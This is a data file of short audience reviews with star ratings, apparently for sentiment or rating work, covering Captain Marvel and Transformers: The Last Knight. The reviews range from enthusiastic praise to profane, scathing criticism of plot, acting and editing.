Should be called Captain Mary Sue.,0.5
Set in a time before the Avengers. A woman with amnesia is endowed with powers fighting a war when she's captured and taught she's more than she thinks she is.,5
"As a marvel action summer blockbuster kind of movie, it has everything you need. But the origin story is so boring and terribly handled and Brie Larson was a terrible casting.",2.5
Captain Marvel is arrogant and irritating for much of the film and they reduced Samuel L Jackson's character to a pathetic clown who is constantly making jokes and the worst part is the way he loses his eye OMG. The CGI is very good but it cannot carry the movie alone.,2
Please view this movie if you feel there needs to be another wedge put between different societal groups,0.5
"definitely the worst of marvel first round of movies. People talk about this as being a gender movie and while the most ridiculous part of this ""girl"" movie was the ""I'm just a girl"" in the end fight, I never had such an eye roll until that moment. The reason this movie failed is that it just wasn't that good, larson's acting wasn't great, it's was akward and stiff, Jackson again takes the show in this one, the only bright point really. Story was weak, acting was mostly weak.",1.5
Loved it.Few more changes and one of the best movies. Story is kind of irelevant to the fact that captain marvel was technechly the first avenger.Helps us to figure out more of the marvel universe,4.5
"Not the most memorable or important Marvel movie. But the cast is great, action is fun and I really dig the 90's vibe and young Samuel L Jackson.",3
Badly written and interesting,0.5
Very bland story. Great graphics.,2
Horrible story. Ruins one of the coolest mysteries of a certain MCU character. Leaves one with nothing to walk away with :(,0.5
"Boring, generic marvel. The cast was barely engaging, which hurts when as an audience member you're supposed to care enough to watch them solve the mystery of who Captain Marvel really is/ what happened to her memories. I will give them credit for not having her fight an exact copy of her abilities only evil a la Black Panther, Iron Man, Winter Soldier, Edward Norton's Hulk, Venom etc etc etc.",2
"Samuel Jackson saves this movie from being completely unwatchable. The story isnt that good, it feels like somebody has thrown a group of characters together and hoped for the best. The acting is sub-par and the jokes, if you can call them that, did NOT work.",1.5
The absolute definitive worst movie ever made in the MCU. You literally cannot argue.,0.5
"The movie fell flat for me. They had a chance to make it really great but they disappointed me. If it wasn't for Samuel L. Jackson, this would have been way worse.",2.5
"It's as good (or bad) as any other Marvel film, if you like that sort of thing you'll like this...",3
Action was good story was meh acting was bad beside Samuel L. Jackson he did amazing over all it was average with nothing special I‚Äôll probably never watch this movie again so I will give it 2 stars,2
"It's a perfectly middle-of-the-road MCU movie. It doesn't actively suck, but neither is it actively good. It's just... there.",3
"Yeah, nah. Overpowered and underwhelming",1.5
The supporting cast kept this movie afloat despite Brie Larson.,3
"I though Brie did a good performance in the ""Room"", that it could translate over, but her acting felt so dry and boring the whole way.",0.5
C'mon. Really? Introduced three villains and made them boring. Nick Fury was just a tool for those wacky funny jokes. And Carol... Aww man. I'm disapponted.,2
"Special Effects: 1,0/Sound Effects: 1,0/Acting: 0,5/Story: 1,0",3.5
Love that there is a movie hero for girls to look up to. Just wish that they would put more effort and money into movies like this,5
"Pretty good interesting very predictable movie starring the wonderful brie Larson, Samuel L Jackson, and Jude law. This movie is pretty much what I expected, a good fun time with wonky cgi as always and no real answers to infinity war. I'm very surprised by the low people score on rotten tomatoes, but I think it's because they want answers for infinity war. I liked the plot but Ronan the accuser is super underused. But besides that and Jude law being Jude law that's all for the negatives. I can't wait for the next marvel movie.",4
How has this been green lit for a sequel? Garbage.,0.5
"I found the movie boring, predictable and kind of whiny.",1
"Even for marvel, far below average.",1
"In my opinion, the most underrated marvel film ever! I actually thought this was a pretty good film. I enjoyed it. It had some good action scenes.",4
Worst MCU movie made.,0.5
"Most of the movie felt forced, if you can get past storytelling and dynamics, then maybe it was a visually good. In fact , the money i wasted on this movie would have been better spent on fireworks which are visually better.",0.5
"The first 1/3 to 3/4 of the movie was a 9/10 or maybe better, but the moment the ""power"" was fully realized and every moment after absolutely destroyed every sense of value and loss that was beautifully woven throughout the early parts of the film.",2
"When I started the movie I was thinking the movie wouldnt be good but when I finished I loved it. It was the first mavel movie who had a woman as a main character. The movie shows how difficult is to be a woman, specially in the army, and its end with she realizing that she is a great woman, she is powerfull and a big heroin.",5
Felt hollow and forgettable. Remove her from avengers endgame and hardly notice. I might give it another go but my daughter and I prefer Star Girl. She had a choice of Captain America or Marvel. See wanted Captain America and I agree.,0.5
What a mess .... Let's hope there isn't a part 2.,0.5
I loved it and i feel it gave little girls a hero to look up to,5
"Muy buena pel√≠cula, me encant√≥ la actuaci√≥n de Brie Larson y los efectos especiales!!, Nick Fury y el agente Coulson trabajando juntos fue hermoso.",5
"Great movie! I had a really good time with it, Carol and Fury friendship is adorable. I really don't understand the hate, Brie Larson fits so well with Carol Danvers and I can't wait to see what this hero is going to bring next time. So excited for 'The Marvels'!!! Please, give us the best sequel ever Nia DaCosta.",5
"Captain Marvel has the distinct honor of being the first MCU film I did not purchase for my personal collection. If this movie and character is supposed to be the flagship that replaces Captain America and Iron Man going forward, Marvel Studios has made a major mistake. Not even 90s nostalgia won me over, nor do I have the most stringent of expectations from your typical Marvel movie.",1.5
"This movie is vanilla ice scream with a side of preachy girl power. I'd imagine if I was a 13 year old girl, I'd probably like this or could relate. If you're not, then its a movie. Wish I could say more about this, but it's very formulaic and predictable, and safe. I'd use the word boring to better describe this movie. I don't hate it as much as some of the other people I know, but this is definitely top 5 of the worst Marvel movies. I wouldn't watch this again, and wouldn't recommend.",1.5
"a really fun film that has a lot of 90's stuff in. good action, good characters. Easy to watch.",4
"If you have insomnia then watch this film, I promise it will put you to sleep",0.5
I've had too high hopes. They pointed out the wrong things. Terrible story. Sammy did a good job though.,0.5
Meh....it passed the time. Glad I didn't pay to see this movie!,2

"Okay, what the fuck is up with the misplaced 90s grunge-rock music? It's weird to be listening to ‚ÄòCome As You Are' while some superhero gets ready to beat the shit out of some alien motherfuckers. Intentions were noble but I think Marvel did their first major female-centric film dirty. It's kind of an awful taste but good execution type of thing that happened here. I would love to see a female-fronted Marvel film that isn't as turgid as `Wonder Woman'‚Äîwhich is actually pretty good in itself. But unlike the above-named DC film, `Captain Marvel' was nowhere close to surpassing its male-centric predecessors. Even `Ant-Man' was more watchable. I say this because I hoped to be proven wrong, even after making at least four attempts to watch this film before eventually getting to finally finish it in one sitting. Furthermore, I hoped misogynistic knobs were merely exaggerating and being their usual salty, hateful selves in every comment section of a given post about this film or Alison Brie. It's overall an okay film but it's kind of evident how these people are clueless about executing a good fem-fronted film and give it justice. It's almost as if it's intentional just so people wouldn't ask them to make something like it again.",2.5
too manipulative -- not enough story not something I'd ever consider watching again or recommending.,0.5
So. Much. Fun! Highly recommended!,5
"the worst transformers movie ever, i am an hardcore transformers fan but this is a nightmare to watch, it doesn't feel like a transformers movie most of the time and the villain is horrible, the only good things were the nemesis prime and bumblebee battle, every scene where megatron is in",2.5
"I went in the film thinking that Michael Bay was gonna go out with a bang instead barely nobody was in the theatre. The enjoyment I had with the first four films was NO LONGER THERE. this wasn't just labeled as The Final Chapter of Bay's Transformers, Bay's Transformers delivered a boring killing blow.",2.5

"They improved it! The 4th movie is kind of meh, but this one is 3x better.",3.5
I have a soft spot for the transformers films and a love for Mark Wahlberg so this was already going to get a decent rating from me but the LENGTH of all these films is WAY too long. Some else said it best. This and the other films are just long trailers. I think if you like the others you'd like this but don't bother if you don't like the others,2.5
Well annoying characters are back the action was fair but definitely far from perfect,3.5
"Honestly the worst installment in the series. Sadly, even the good stuff in it doesn't make it up for me unlike Revenge of the Fallen or Age of Extinction. And a sad shame cause it leaves so many unanswered questions that will never get solved since this killed the Bayverse. But after a rewatch a month or two ago, it's a so bad it's good movie in my eyes, so I had some enjoyment watching it. Pros -Like the previous films, amazing VFX -Transformers are still awesome, including new ones like Cogman, Hot Rod and Dragonstorm, as well as the returning ones such as the main AOE group, Megatron and Barricade. -Sound design is great -Nemesis Prime is a very threatening character -Some humor is a bit funny -Return of some recognizable characters from the previous films, most notably Lennox -The final battle and Nemesis Prime vs Bumblebee are pretty good. -Music is great CONS: -Very messy story and plot, with a lot of stuff not making sense and becoming very confusing. -Very shaky camera work and the aspect ratio changes too much. -I don't mind Micheal Bay reusing scenes, but during the submarine scene, they crash and reuse the scene where Megatron crashes into a sub after reviving in ROTF, which they didn't even bother to edit it out, it made me laugh so hard. -Various unnecessary scenes that weren't really needed -Humor is hit or miss -Not much good action packed scenes compared to the previous films. -Quintessa was a‚Ä¶ okay villain, also a part of me wished Nemesis Prime was a separate Transformer rather than mind controlled Optimus -Left lots of questions that will never get resolved (ex: how did Galvatron become Megatron again? Sam Witwicky's fate. And Unicron is still around, what will hapoen then?) -The movie marked the end of the Bayverse, which can be upsetting to some since DOTM could have been the end, or the fact we won't get a definitive ending of the franchise.",2.5
Rating: 7/10. 77/100,3.5
"I can't even stop thinking about the time I was in a theater with two little kids barely anyone was in there. Bumblebee had a sold out showing when I seen it and Rise of the Beasts had enough people in the theater. While watching, the enjoyment from the first four was no longer there.",2.5
"Thats it. Bayformer movies are over. We had the most satisfying ending in Dark of the Moon until one funded movie ruined it all. We have moved on. The only good things in it were Hotrod, Dinobots, and nitrozeus. But I almost knew none of the movie cause I left barely during the end of the first half.",0.5
I just like the movie it's OK that people enjoy it but I still dislike it and focus way too much on the humans and it was really boring,0.5
"Michael Bay Ruined Transformers, none of his transformers movies are good",0.5
This was just not good bay should of did something else and not bring Megatron back,2
"Transformers: The Last Knight is an incomprehensible and convoluted mess that abandons any semblance of coherent storytelling, instead opting for a haphazard mishmash of historical references and robot battles, leading to a mind-numbing and disjointed cinematic experience that epitomizes the franchise's declining quality.",1
Nothing new here except a new villain to continue the franchise. Way too long.,2
Transformers 5 poteva essere decente solo se Bay avesse dichiarato che era un troll molto simpatico,0.5
Throw it in the trash,0.5
"Although I consider myself a fan of the ""Transformers"" franchise, I found ""The Last Knight"" to be simply unwatchable; I walked out of the theater and saw ""Baby Driver"" instead.",0.5
"It was painful, took me 4 whole days to watch this, omg.",1.5
very boring and the film was way too long.,1
I love this movie I don't understand why people hate it!!,5
I mean it was a LITTLE better than the fourth film‚Ä¶,2
"Better than The Age of Extinction, and Revenge of The Fallen! But it's still boring in the first and second act, but the Third Act and Finale is the one I was looking forward to this movie",2.5
Not going to say why this one is awful because it is.,0.5
Such a terrible waste of effort with this installment in the Transformers series. Why does Mark Wahlberg sound like he is always out of breath when he talks? Michael Bay does his usual routine of creating explosive visuals that translates well across multiple viewing demographics.,1
Very very boring story,0.5
Probably the worst movie I have ever seen,0.5
"This so called ""Transformers"" movie, these movies should be called Bayformers, nothing than meets the eye. 2/10 F",0.5
The movie that kills off the already dying Bayverse is The Last Knight. This movie is worse than Age of Extinction and fails to give us anything good or new plot or character wise.,1
"a fitting and emotional and brilliant end to the Michael Bay Transformer series. the Music is outstanding, the CGI is gorgeous and this is one of the best looking movies I've ever seen and I love the new actors they hired for this film. 9.5/10. these Michael Bay Movies are all underrated and deserve way more love.",4.5
Loved every part of this movie!,5
This movie is so bad. This is a stain on the transformers franchise. It's better than AOE because it's kinda funny bad.,1
"This movie completely destroys and blows up the foundation that Michael Bay laid when he made the first Transformers live action movie, the story of the all the previous moves goes out the window, this film feels like more of a standalone movie rather than a continuation of the Transformers live action movie line, with it's eye straining cuts from 16:9 ratio to full screen for what feels like every 10 seconds, this movie is what I would like to call Bay's playground, due to him basically not caring for the story and throwing Transformer characters into the movie, Transformers: The Last Knight a movie just to past the time and nothing else, I feel sorry for the entire team that worked on this movie, for all their hard work and talent to be wasted on a movie that drove the live action Transformers movie line into the dirt",2
"It isn't the worse movie, but more explanation could made it better , but it holds up somewhere in my heart about robots , villains , action an music",5
I really did enjoy this movie and I don‚Äôt get the hate for it either like most people do and I love Laura Haddock in this movie too she did a great job in this movie and she is a beautiful gorgeous actress too and I give this movie a 10/10 stars love this movie.,5
Bad movie not enjoyable overall it's to much an it's boring,1
I want to likeit because I'm a huge transformers fan but I just can't it's not good. There are parts I like but bay just decides to blow up any previously established continuity in this movie,1.5
"This movie's writing, acting, and dialogue are atrocious. The plot is all over the place. The Decepticons are working with humans for some reason which is totally out of character. WHAT? Decepticons don't negotiate. They kill anyone who stands in their way. The writers also gave transformers blood in this one. Apparently they can bleed out now? Except they are robots? Even if I were to ignore that this is a Transformers movie, it's still bad by movie standards. Main characters we're very unlikeable and poorly written. The plot also doesn't make any sense. Apparently transformers fought in various wars in history and this was all covered up by the Witwikies family. One of the worst movies I've ever seen.",0.5
"An absolute banger to watch, this movie offers the most heartshaking moments and settings ever seen. The story connected with a historical vibe and properly portrayed the end of the world. It also struck hearts with tensive battles.",5
"the worst in the franchise. there is too much things happening and the timeline gets a little weird, but the cgi is great",2
"A waste of time and money, Transformers the last knight is just as bad the previous entry, but this time it lacks any new gimmicks to pull in the money. The film feels unfinished and even more than previous entry, simply waved away it unfulfilled promises stating ""they'll get ‚Äòem next time""",0.5
"Transformers: the last knight is a good movie, sure 1. The movie god negative reviews by both fans and critics and Hershley flopped at the box office and 2. The movie is not as good as it's predesasors transformers, transformers: revenge of the fallen, transformers: the dark moon and transformers: age of extinction, but dispute all of this, in my opinion, transformers: the last knight is still a great sequel to 2014's transformers: age of extinction, hope you all understand my opinion about the movie",4
"Only because this movie can't be rated as a zero. The worst. There is nothing redeemable in this movie. Convoluted and nonsense plot, lack of proper transformers action, more CGI noise for the final battle and ridiculous retconning of prior movies and lore. DON'T. WATCH. THIS. MOVIE.",0.5
"Ok. This movie makes Age of Extinction a Masterpiece. There are more Subplots than plot holes, and there are a LOT. Galvatron is somehow Megatron, what happened to the AllSpark, How is Earth Unicron with out anyone noticing, Quintessa is the creator? I thought they were made of flesh and multiple. what happened to Cybertron's size? It was 4x larger than earth and now it is 1/4 the size. Oh, and now Optimus is evil. Oh actually, bumblebee's voice turns him good again. Optimus said he hadn't heard it since the war. BUT HE HEARD HIM IN THE FIRST MOVIE! I feel like no one on the production team remembered that. Oh well the last 30 minutes is actually pretty good. not worth watching though",1.5
The only reason I think this movie is mid but I only liked the bumblebee vs Nemesis prime fight really hit the heart strings to me cause he was having to fight us leader and his friend and the final battle was ok it wasn't the best fight act of the film but this movie isn't really that good I'd give it a solid 3/10 I only liked the fight scenes,2.5
"Pretty much everything accept the effects seemed to have no effort put into this movie, the rest of the bayformers movies were no masterpieces and this one even makes age of extinction slightly passable, unfocused, convulsed and messy, that's what this film is.",1
"When Bay focuses on spectacle over story/character, the movie works. Unfortunately it doesn't make it very memorable",2
"I dont understand the hate this movie received i really enjoyed it, the plot was quite interesting and brilliantly Intriguing. The acting was brilliant especially Anthony Hopkins. This one felt alot more fun than the rest of the franchise 10/10 in my opinion",4.5
Movie was good in my opinion but the story felt lack lustered. Action scenes was cool. Less humans !,3
"This movie went through the grinder in the editing room. The pacing's souped up like it was on speed or coke, leading it to feel like several stories/episodes of a fragmented ""movie idea"". There are interesting plot points, but this monstrosity was all over the place. When you think you're just about getting the rhythm of the storytelling, another sideshow opens up and calls your attention to try to understand what's going on. It was a weird experience and the magic of watching a cartoon to live action movie seemed like it was purposely replaced by a gattling gun of experiments on how to tell a transformers story. You will not be able to breathe to form an opinion on how the story's going, it will mentally shove you to keep on going forward.",1.5
"It's not perfect, I mean could have been better. But not the worst movie I've seen. It will be fun. At least try for those who haven't (after seeing the other 4 Transformers Movies).",3.5
The greatest 02 hours: and 28 minutes ever!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!,5
"Transformers: The Last Knight is a confusing clump of badness. While it does have impressive visual effects and fight scenes, it completely crashes due to its many confusing plot points and unnecessary moments. The Worst of the franchise for sure. Rating: 12%",1
"Having a paper thin plot, a wild premise and weak characters, Transformers: The Last Knight boasts state-of-the-art special effects (As to be expected of Transformers) but can't seem to do anything else justice.",1.5
Probably the best transformers movie since the original film.,3
Don't watch this film just don't watch it please.,1.5
"I love the Voice Acting. CGI is best. Megatron was ok I hated Quintessa. Writing was ok-good. Story/Plot, I loved Bumblebee's story from being a Nazi fighter with Hotrod to being a global protector. Casting could have been better. I loved the characters (other than Quintessa). Adventure the world was literally gonna end. I love the ending the final battle was kick ass in my opinion way better than Transformers 4.",3.5
"Everything dosent feels like anything when everything is a joke, the humor is just everywhere and so dumb and i dont feel like watching this for anything of a plot, just for loud/mindless action",1.5
"Transformers: The Last Knight (2017) has good-looking effects and good action, but the story and characters are super lackluster and generic.",2
"this Transformers was enjoyable. I didn't have high expectations going in, but it was your typical Transformers movie. Anthony Hopkins was a fantastic addition to the cast, as he always is to any film. The fact that Optimus Prime appeared in the film for less than five minutes and played the antagonist for even less time raises my only two concerns. Optimus was supposed to be the villain in this movie, but he didn't do much to merit the hype. Additionally, the entire King Arthur story didn't appear to match the mould for this genre. Even if it didn't make much sense, it was nice. The new Autobots were great.",3.5
.............GOD NO.,0.5
"It's a Transformers movie and therefore shouldn't be taken too seriously. It's fun in its own way and great to see many of those beloved characters again for another outing. In this context, Transformers 5 is an enjoyable movie.",3.5
"It has many errors: like Galvatron becoming Megatron again (with no explanation from the movie), or the Transformers helping the humans in the history wars like WW2. And it's boring.",1
Feels like we were leading to some thing but we never got there,1.5
Camera gives a close up on Megatron: a Megatron automatically: Helmet closes,1
"* WHAT EVEN WAS THIS? * This is a very memorable film for me because it was the 1st Transformers movie I watched and at the time I gave like 3/5, BUT NOW... I consider it one of the worst movies of all time! üòí",0.5
"It would be great as every transformers movies, It could have been great, But the Story Was a meh and a MESS.",1.5
This makes no sense and it's really boring.,1
"A pesar de que soy un gran amante de los transformers no puedo negar que esta es la peor que hay, la historia de que los tranformers estuvieron desde hace a√±os en la tierra es una total fumada por parte del director, las unicas 4 veces que la he visto siempre ando pidiendo que termine lo antes posible.",1
The animation top tier as always. But story was meh..,3
"Another mediocre yet rather entertaining entry into this excessively bloated and repetitive franchise, Transformers: The Last Knight undoes the work of Age of Extinction and shifts its focus - rather strangely - to the random idea of Medieval Britain as the base of its ridiculous story.",2.5
con grandes efectos y una trama de calidad logran dar un buen espectaculo,5
"The main characters and the actors who perform them are the ruin of this movie, the story is a nonsense",0.5
"Silly, bloated and ridiculous. I laughed so hard at the dialogue.",1.5
"This movie has great action and all, but the movie itself made no sense at all. The plot I think should have focused more on nemesis prime because all of the movie posters have nemesis prime in it but he only lasts for about 6 minutes before he turns back to Optimus.",3
Ages 13 and older!!!!!!!!!!!!! The greatest 02 hours: and 28 minutes ever!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!,5
"Not exactly leaps and bounds above its predecessor but, Transformers: the Last Knight has slightly more redeeming qualities. Our protagonist is not as annoying as he was in the Age of Extinction. The action and VFX is still top-notch, as one would expect from a Michael Bay directed film. If you're wanting more, you're out of luck. Yet another hollow and spectacular action film. The franchise of Transformers is a guilty pleasure so, I'll watch them despite how horrible they can be.",2.5
Worst movie and terrible plot,0.5
Nope... Terrible movie right here. Great visuals. Horrible plot and story delivery. Acting was non existent. Just a complete and utter failure. Disrespectful to fans that they delivered this garbage and called it a competent movie,0.5
Really not much I can say about the fifth transformers movie. I feel like the only reason I wanted so see this movie so badly when it came out was because I really like robots and dinosaurs and this movie has both of these in the form of the dinobots.,2
"People loved the first live-action Transformers movie, what went wrong with the rest? Why didn't they like Revenge of the Fallen, Dark of the Moon, Age of Extinction, and the Last Knight? What went wrong?",4
Bay is Uwe Boll with a bigger budget.,0.5
"This was the worst story and dialogue of any of the Michael Bay Transformers films, and that is saying something. The style of the Transformers was all wrong from the start.",0.5
"While the premise of the movie is one that has a lot of potential, this movie manages to mess it all up consistently. With long and boring dialogue that becomes irrelevant almost right after it is said, and every character having the same personality of shooting off one liners and acting on every clich√© in the book, the movie does not do a good job of holding your attention. The effects look good, but everything else manages to bring this movie down. If you are a fan of the previous Transformers movies, you should probably skip this movie. If you are a fan of Transformers, you should really evade this movie like your life depends on it. If you are a casual movie goer, you can probably spend your time and money more wisely by sitting outside of the theater and just looking at the movie poster for Transformers the Last Knight for two and half hours.",1
As bad as almost all of the franchise so far.,0.5

This isn't my favourite transformers...at 1st I didn't like where the story was going...it grew on me a bit as the film went on...again at 2 and a half hours too long,3
"After the disappointment that Age of Extinction was, my hopes from this franchise had fallen to zero. However, I still had one ray of hope - it couldn't be worse than that, right? The story is already bad, the characters are no longer interesting, the continuity doesn't matter anymore, and hey, just one more movie is left after which I'll get to watch the super-awesome Bumblebee, so let's just tolerate one more movie. And boy, was I wrong when I didn't take one more factor into account: At least the cinematography was good in all the previous movies. Here even that fails. The most distracting thing in this entire movie is the continuously changing aspect ratio. There's a very important rule in filmmaking, that your jump cuts should be so seamless that the audience shouldn't realise when the jump cut takes place. Look at Marvel movies. When Black Widow fights there are like a gazillion jump cuts in just one somersault. If that is supposed to be silently moving across the room, the jump cuts of The Last Knight are like dragging an almirah across the room hoping no one would notice. You can literally see the jump cuts happen! And speaking of jump cuts ruining the mood, whenever the jump cuts happen in the same scene it feels like it is a completely different scene. Like in the scene where they are in the elevator and they see the butler bot over there, it feels as if the scene outside the elevator is a completely different place. The lighting is also so bad, it doesn't even feel like there's continuity until the jump cut happens again and the camera goes back to Cade and company. Apart from that there is also a scene where Cade stops his car in front of the sheriff and when he's stopping the car there's a lot of dust. But when the jump cut happens the dust is all gone. And while he's still stopping his car his voice starts coming. Like, he isn't even moving his mouth and the words are coming out louder than the car's engine. Another time the ADR ruins the mood is when the butler bot is playing the piano when the story of the Transformers is being narrated. He is asked to stop playing... Twice! A bad joke is repeated twice in just fifteen seconds! Then of course there's the fight between Optimus Prime and Bumblebee, the legendary fight for which everyone came to watch it. Because the movie had been advertised by saying that Optimus Prime is the bad guy in this movie. And guess how their fight ends? Martha! No, not by saying those exact words, but something similar. Just as Optimus is about to stab Bumblebee, he says, ""I'm Bumblebee. I'll lay my life before you!"" And that changes Optimus Prime's mood. First of all, why did it change his mood? He's a robot not a human. Emotions can't alter his programming. And secondly how on earth did Bumblebee suddenly start speaking? It's not like his voice suddenly fixed. It was permanently damaged. It's kinda weird that in this movie the humans are not the bad part. In fact I really liked its starting, where they were showing Merlin take help from the dragon Transformer to win the battle. I also liked how those kids were collecting spare parts to survive. Even showing Optimus Prime on his planet looked so cool. The way it began I was really wondering why on earth this movie has such bad reviews. If the movie focused on either of the two things it could have been a great movie. I really wanted to like it, but the jump cuts were making me laugh even on the serious scenes. I'm sorry, Michael Bay. But I think you've ruined a good movie by hiring a bad cinematographer.",1.5
Once again new character popping up that we've never seen. Just where did these characters come from FANTASY? The only character from the previous films was Artimus Prime and Bubblebee. This movie has so many plot holes you could drive a truck through. Its time to let Transformers to rest on its original laurels.,1.5
"Unfortunately, Transformers The Last Knight is a complete disaster, Michael Bay has to leave the franchise immediately two tragedies followed by Age of Extinction and The Last Knight, the script of this 5 is HORRIBLE and still disrespects the story that was previously told in the first 3 films and not even the action scenes are saved since the cameraman has Parkinson's, the only good scenes are the fight between Bee and Optimus Prime and of course the scene where Optimus says: MY NAME IS OPTIMUS PRIME. (1.5/10)",1
"Transformers 5.... Where do I even start with this movie? When we saw Transformers 4 in cinemas 2014, everyone was deeply disappointed. When they thought things couldn't get any worse, they did once Transformers 5 was confirmed. What did we get? Terrible cast performances, especially from newcomer Laura Haddock. Excessively long runtime Little character development Embarrassingly pointless humor You could watch this movie over and over again and still be able to point out all of the flaws. It's that kind of movie that would make you refuse to eat your popcorn even whilst watching it the first time over. Transformers 5 is a funny joke, but with a bad punchline But the funniest part is that I used to think of Transformers 2, 4 and 5 as the best Transformers movies. But I can see the clearer side.",0.5
it was amazing especially the final battle,5
"The camera work is awful, the last battle is epic.",3
Its jennifer lawrence for me,5
"This movie is so horrendous. Doesn't work in the timeline, and a mountain of plot holes. 260 million dollar budget but none of it went towards the writing.",0.5
"What the heck is this movie? It's even worse than The Last Airbender movie and The Room. In every scene, someone cusses for no reason. The visual effects is just ok, but the plot of this movie is completely terrible. Don't see why the government needs to hunt down the Autobots. They've saved the world and you want them dead for it? The director must've been fresh out of ideas and decided to change the plot and make everything terrible. The budget for this movie is less than a YouTube video and the setting is crap. This is a terrible movie and I don't want to watch this ever again.",0.5
Maybe it‚Äôs best to leave this to rot. plot makes 0 sense at least the other ones were better.,0.5
"What did I watch? Unless you are twelve the movie was a total mess! If they REALLY want to continue this franchise make it somewhat believable. Lose the kids in the film! What are they there for comic relief? Big stars reciting forgettable lines? Again why? This was about the end of man-kind and we have jokes??? Where is all the metal coming from to build odd structures that do NOTHING! Dinobots having offspring? Merlin being a drunken fake? I'm sure Red Riding Hood was in there somewhere. Or maybe Doctor who will figure it all out, and wake up the kid having this nightmare of a dream. This was made for FLUSHING!",0.5
"Despite the poor ratings, I thought this was an excellent cast and great storyline in the series of the Transformers. Can't wait for the next installment",4

"I loved this franchise, this was my childhood. This film kills my love and passion for this franchise. The film that the director just does not care anymore.",0.5
I'm being 100% honest with you whoever reads this review I think the movie was good. even though I wished there were more action scenes in the movie. but overall I think it is good,5
Huge disappointment for a finale like I'm a huge transformers fan and this is how it ends it was not good at all,2

"There are a lot of head-scratching moments. However, it mostly delivers popcorn-flick fun.",3
Wow this movie was so bad. So long for no reason. I don't even remember what it was about. Bumblebee talking was too convenient but ends up being the best part of the movie.,1.5
"Another bad transformers movie, that focuses too much on the humans.This movie has plenty of racism and has all the usual Michael bay things and is overall just bad.",1
Like transformers suppose to be,5
"I Loved this movie so much they CGI is so good, and everything is so real. The story is so good but it doesn't make sense that originally they can for the cube but now it is for the staff, but that doesn't change my mind at all. When I watched this in cinema it was the best cinema experience ever, I hope they do another transformers movie but with more Megatron screen time as he is my favourite character in these movies but he always haves such little screen time. this movie in insane",5
"The critics went out of their league to criticize this movie. But they fail to see this movie for what it is. A thoroughly entertaining and funny experience with absolute Bayhem! You can't analyze and think too hard on what you see. This is meant to be two and a half hour with amazing special effects, epic music and ridicolous moments. This movie looks so grand and epic on the big screen in cinema, thanks to Bay filming it almost entirely with IMAX 3-D cameras. After an very intriguing prologue set in medieval times with catapults casting fireballs and big armys clashing together in ""Gladiator"" style, we also see Stanley Tucci as drunk Merlin pleading with transformer knights. The crazy tone is set after the first 5 minutes. The movie is like the previous ones, hyperactive and fast paced. There are explosions and fighting, and very few quite character moments. But the few that are work well, especially the ""father-daughter"" set-up with Cade Yeager and Izabella. They have tough love but strong chemistry, and I wish we would see more of them together and more of Izabella, because she was the best actor in this movie. All the other well-known actors seem to know they are in a Transformers movie. They don't take it too seriously, it is all about acting over-the-top and bonkers. The ones that do that best is Anthony Hopkins with his hilarious robot butler ""Cogman"". I think simply they're presence made this movie the funniest out of the 5. The plot is very bloated and stuffed, altough the story is generic and similiar to the previous ones. It is all about finding Merlin's staff, that in Quintessa's hands will rebuild Cybertron and destroy Earth. Earth who is revealed to be Unicron, the ancient enemy of Cybertron. The talisman that Cade gets from a dying knight will lead to the staff. And cybertron is approaching earth rapidly, while also Megatron collaborates with the ""TRF"" who is the new rogue military force. And I haven't mentioned that Optimus Prime gets brainwashed by Quintessa and turns bad. So I could see why this is too much for someone, it was clearly an answer to ""too much of everything"" from the writer's room. But it worked for me. The middle act in London is the most crazy and ludicrous. The final act is an massive showdown of earth shattering preposterousness. An workable ending for the Bayformers, but then we get the stupid cliffhanger which should have been cut out. Personally I would've liked a more grounded movie with less subplots, who is more focused. We could follow the kids we meet at the beginning instead of Viviane and Cade troughout the movie and I would have liked more of Nemesis Prime. This movie clearly had a lot of talent and merits behind the screen, and although the movie is pretty forgettable and hated by many, I still found it to be worth watching. It captured a sense of escapism and if you want to experience a big-budget massive summer blockbuster that also is fun, this is the movie for you. Roll out!",5
The worst of the franchise.after four films this one falls the most with cheesy story and action.,1
"Eek! Slow narrative, confusing battle camera, extremely lazy script.",1
What did I think of Transformers: The Last Knight? Check out my full review below: https://open.spotify.com/episode/1ylG7AdqpU9tlGHO54DBfI?si=j3F-Eo4TTViT8kTqmiA56g,0.5
transformers 5 is a bullshit,2
"you know you touched rock bottom when you willingly watch transformers 5. what a piece of garbage -Dialogue as if the writers hadn't talk to a kid in their life (or another human being for that matter) -aspect ratio changing EVERY SINGLE SHOT, not every scene; EVERY. SHOT. -camera movements without reason -cuts and framing that would be nice if it was a PARODY of an action movie and that would make anyone with eyes cringe. -random vignetting like they don't know how to use a fucking lens -no character development... no characters at all... -no reasoning behind the character's actions -awful pathetic attempts of ""comedy"" -lines that you can feel the actors hurt while delivering them... but on the bright side, if you don't understand what ""having a motive"" for everything in your scenes mean, every frame of this 2 hours and a half ""film"" is a perfect example of what not to do. the spectacle is the same as always and the only reason its not just half a star, a few things have improved since the previous ones which is not saying much, and the sexualisation of characters, even when it hasn't disappeared, its less prominent in this one. it is a scream of glory for the vfx artists but nothing beyond that, and i have to clarify that some scenes keep being nonsensical visual noise, and shortcuts in the transforming part of a movie called transformers leaves some things to desire in that area too, but some effect filled scenes were actually interesting.",1
A new low for Micheal Bay.,2
The only good thing about this movie was Anthony Hopkins. I mean thank God the guy is a great actor cause he was carrying the load of making this movie pass for even decent. I still love the whole Transformers theme but man they need to work on story plots and the scene were they attach Cybertron to earth is just pathetically bad,2.5
"Good picture quality, a decent ending, and an interesting, albeit continuity destroying, story ancient astronaut theorists would love doesn‚Äôt make up for the constant changes in aspect ratio that had zero artistic purpose. Majorly distracting!",3
"Utter crap. Other 4 were fantastic so I had high hopes for this, but what a waste of time. Absolutely terrible film.",1
I thought this was a ridiculously long movie compared to the others and thought it must have passed 3 hours and 30 minutes. Then i found out it was 2 hours and 22; the shortest. Well.,1
Pretty bad a bit interesting not bad action,3
TRANSFORMERS: THE LAST Bro. I hope so.,1.5
"When it comes to the voting up and down system on Google, I wish I can downvote this and upvote this at the same time. I saw the long climax of The Last Knight on TV, but today I watched the whole movie. Wow. The editing, acting, the pacing, the list goes on, the movie is a little offensive and again tries to put in curse words and for what? This is well half of the film. The second half, all the battles towards the end, the climax is where it gets better, and the sound gets better. The sound in the other part of the movie was just low. So I give this a alittle over three but not exactly three and a half but getting there maybe.",3
